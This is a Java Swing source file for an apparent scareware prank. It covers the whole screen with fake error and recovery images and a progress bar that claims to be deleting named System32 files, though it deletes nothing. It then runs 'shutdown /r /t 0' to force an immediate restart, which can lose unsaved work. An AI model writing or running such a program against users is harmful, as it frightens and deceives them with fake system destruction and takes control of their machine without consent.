import javax.sound.sampled.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;

public class Action extends JPanel implements ActionListener {
    JFrame frame = new JFrame();
    JLabel percent = new JLabel("0");
    JLabel error = new JLabel();
    JButton genius = new JButton();
    JLabel recovery = new JLabel();
    JLabel deleting = new JLabel();
    JLabel del_label = new JLabel("Removing System32...");
    JButton settings = new JButton();
    JProgressBar bar = new JProgressBar(0,100);
    Runtime runtime = Runtime.getRuntime();
    Color color = new Color(0xDFF1F8FD, true);
    Color color2 = new Color(0x19AB12);
    public boolean bacy = false;
    public String resolution;
    public int seconds = 0;
    public int bar_time = 0;

    Timer time = new Timer(1000, new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent e) {
            seconds += 1;
            if (seconds > 2 && seconds <= 4) {
                percent.setText("24");
                if (resolution.equals("1920/1080")) {
                    percent.setLocation(205, 610);
                }
            } else if (seconds > 4 && seconds <= 6) {
                percent.setText("35");
            } else if (seconds > 6 && seconds <= 9) {
                percent.setText("47");
            } else if (seconds > 9 && seconds <= 11) {
                percent.setText("59");
            } else if (seconds == 12) {
                percent.setText("72");
            } else if (seconds >= 13 && seconds < 15) {
                percent.setText("100");
                if (resolution.equals("1920/1080")) {
                    percent.setLocation(182, 610);
                }
            } else if (seconds == 15) {
                if (resolution.equals("1920/1080")) {
                    error.setIcon(new ImageIcon("sets/black_1080.jpg"));
                }
                percent.setVisible(false);
                genius.setVisible(false);
            } else if (seconds == 16) {
                time.stop();
                Recovery();
            } else if (seconds == 17) {
                error.setVisible(false);
                Deleting();
            } else if (seconds == 19) {
                time.stop();
                time2.start();
            } else if (seconds == 20) {
                deleting.setVisible(false);
                bar.setVisible(false);
                del_label.setVisible(false);
                error.setVisible(true);
            } else if (seconds == 21) {
                time.stop();
                frame.dispose();
            }
        }
    });

    Timer time2 = new Timer(100, new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent e) {
            if (!bacy) {
                bar.setValue(bar_time);
                bar.setString(bar_time + "%");
                bar_time += 1;

                if (bar_time == 2) {
                    del_label.setText("Removing System32/syssettings.dll");
                } else if (bar_time == 6) {
                    del_label.setText("Removing System32/egerghege.sys");
                } else if (bar_time == 10) {
                    del_label.setText("Removing System32/gsxgdfghbfd.dll");
                } else if (bar_time == 14) {
                    del_label.setText("Removing System32/sdfgvsgrtr.sys");
                } else if (bar_time == 18) {
                    del_label.setText("Removing System32/cxvxbdfhead.dll");
                } else if (bar_time == 22) {
                    del_label.setText("Removing System32/asfsdghthhb.sys");
                } else if (bar_time == 26) {
                    del_label.setText("Removing System32/userdataprof.dll");
                } else if (bar_time == 30) {
                    del_label.setText("Removing System32/egerghege.dll");
                } else if (bar_time == 34) {
                    del_label.setText("Removing System32/fdgdfhdbv.dll");
                } else if (bar_time == 38) {
                    del_label.setText("Removing System32/f3d2ffd.sys");
                } else if (bar_time == 42) {
                    del_label.setText("Removing System32/ffwefwfwavf.dll");
                } else if (bar_time == 46) {
                    del_label.setText("Removing System32/xcfvvsdvsdv.dll");
                } else if (bar_time == 50) {
                    del_label.setText("Removing System32/cmd.exe");
                } else if (bar_time == 54) {
                    del_label.setText("Removing System32/User_Toly.dll");
                } else if (bar_time == 58) {
                    del_label.setText("Removing System32/windows32.dll");
                } else if (bar_time == 62) {
                    del_label.setText("Removing System32/Windows.UI.harddrive.dll");
                } else if (bar_time == 64) {
                    del_label.setText("Removing System32/Windows.UI.win.dll");
                } else if (bar_time == 66) {
                    del_label.setText("Removing System32/Windows.UI.search.dll");
                } else if (bar_time == 68) {
                    del_label.setText("Removing System32/Windows.UI.shell.dll");
                } else if (bar_time == 70) {
                    del_label.setText("Removing System32/Windows.UI.host.dll");
                } else if (bar_time == 72) {
                    del_label.setText("Removing System32/Windows.UI.security.dll");
                } else if (bar_time == 74) {
                    del_label.setText("Removing System32/Windows.UI.provide.dll");
                } else if (bar_time == 76) {
                    del_label.setText("Removing System32/Windows.UI.divide.dll");
                } else if (bar_time == 78) {
                    del_label.setText("Removing System32/Windows.UI.capitulate.dll");
                } else if (bar_time == 80) {
                    del_label.setText("Removing System32/Windows.UI.exec.dll");
                } else if (bar_time == 82) {
                    del_label.setText("Removing System32/Windows.UI.logon.dll");
                } else if (bar_time == 84) {
                    del_label.setText("Removing System32/Windows.UI.srssrs.dll");
                } else if (bar_time == 86) {
                    del_label.setText("Removing System32/Windows.UI.system.dll");
                } else if (bar_time == 88) {
                    del_label.setText("Removing System32/Windows.UI.manual.dll");
                } else if (bar_time == 90) {
                    del_label.setText("Removing System32/Windows.UI.explorer.dll");
                } else if (bar_time == 92) {
                    del_label.setText("Removing System32...Successful");
                } else if (bar_time >= 100) {
                    time2.stop();
                    time.start();
                    try {
                        runtime.exec("shutdown /r /t 0");
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                    frame.dispose();
                }
            }
        }
    });

    Action() throws IOException {

        Start();

        this.add(percent);
        this.add(genius);
        this.add(settings);
        this.add(bar);
        this.add(del_label);
        this.add(recovery);
        this.add(deleting);
        this.add(error);
        this.setLayout(null);
        this.setBackground(Color.white);
        this.setSize(frame.getSize());

        frame.add(this);
        frame.setUndecorated(true);
        frame.setLocation(0,0);
        frame.setAlwaysOnTop(true);
        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        frame.setSize(Toolkit.getDefaultToolkit().getScreenSize().width,Toolkit.getDefaultToolkit().getScreenSize().height);
        frame.setVisible(true);

        if (frame.getSize().width==1920 && frame.getSize().height==1080){
            resolution = "1920/1080";
        }

        if (resolution.equals("1920/1080")){
            error.setIcon(new ImageIcon("sets/fake_error_1080.jpg"));
            recovery.setIcon(new ImageIcon("sets/recovery_1080.jpg"));
            deleting.setIcon(new ImageIcon("sets/deleting_1080.jpg"));
            genius.setIcon(new ImageIcon("sets/Genius_1080.jpg"));
            settings.setIcon(new ImageIcon("sets/settings_1080.jpg"));

            error.setBounds(0,0,new ImageIcon("sets/fake_error_1080.jpg").getIconWidth(),new ImageIcon("sets/fake_error_1080.jpg").getIconHeight());
            recovery.setBounds(0,0,new ImageIcon("sets/recovery_1080.jpg").getIconWidth(),new ImageIcon("sets/recovery_1080.jpg").getIconHeight());
            deleting.setBounds(0,0,new ImageIcon("sets/deleting_1080.jpg").getIconWidth(),new ImageIcon("sets/deleting_1080.jpg").getIconHeight());
            genius.setBounds(208,702,new ImageIcon("sets/Genius_1080.jpg").getIconWidth(),new ImageIcon("sets/Genius_1080.jpg").getIconHeight());
            settings.setBounds(204,735,new ImageIcon("sets/settings_1080.jpg").getIconWidth(),new ImageIcon("sets/settings_1080.jpg").getIconHeight());
            percent.setBounds(226,610,100,39);
            percent.setFont(new Font("SansSerif",Font.PLAIN,39));
            bar.setBounds(160,600,1300,55);
            del_label.setBounds(160,563,1000,35);
        }

        else{
            System.out.println("Error");
        }

        percent.setForeground(color);

        genius.setBorderPainted(false);
        genius.setContentAreaFilled(false);
        genius.addActionListener(this);

        settings.addActionListener(this);

        del_label.setFont(new Font(null,Font.PLAIN,30));
        del_label.setForeground(color);

        bar.setString("Removing...");
        bar.setStringPainted(true);
        bar.setFont(new Font(null,Font.PLAIN,40));
        bar.setBackground(Color.lightGray);
        bar.setForeground(color2);

    }

    public void Start() throws IOException {
        recovery.setVisible(false);
        settings.setVisible(false);
        deleting.setVisible(false);
        bar.setVisible(false);
        del_label.setVisible(false);

        error.setVisible(true);
        percent.setVisible(true);
        genius.setVisible(true);
        time.start();
    }

    public void Recovery(){
        error.setVisible(false);
        percent.setVisible(false);
        genius.setVisible(false);
        deleting.setVisible(false);
        bar.setVisible(false);
        del_label.setVisible(false);

        recovery.setVisible(true);
        settings.setVisible(true);
    }

    public void Deleting(){
        error.setVisible(false);
        percent.setVisible(false);
        genius.setVisible(false);
        recovery.setVisible(false);
        settings.setVisible(false);

        deleting.setVisible(true);
        bar.setVisible(true);
        del_label.setVisible(true);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        if (e.getSource()==genius) {
            bacy = true;
            time.stop();
            time2.start();
            percent.setVisible(false);
            genius.setVisible(false);

            if (resolution.equals("1920/1080")) {
                error.setIcon(new ImageIcon("sets/BACYA_1080.jpg"));
            }

            File file = new File("sets/evrey.wav");
            AudioInputStream audioStream = null;
            try {
                audioStream = AudioSystem.getAudioInputStream(file);
            } catch (UnsupportedAudioFileException | IOException ex) {
                throw new RuntimeException(ex);
            }
            Clip clip = null;
            try {
                clip = AudioSystem.getClip();
            } catch (LineUnavailableException ex) {
                throw new RuntimeException(ex);
            }
            try {
                clip.open(audioStream);
            } catch (LineUnavailableException | IOException ex) {
                throw new RuntimeException(ex);
            }
            clip.start();

        } else if (e.getSource()==settings){
            settings.setVisible(false);
            recovery.setVisible(false);
            error.setVisible(true);
            time.start();
        }
    }
}
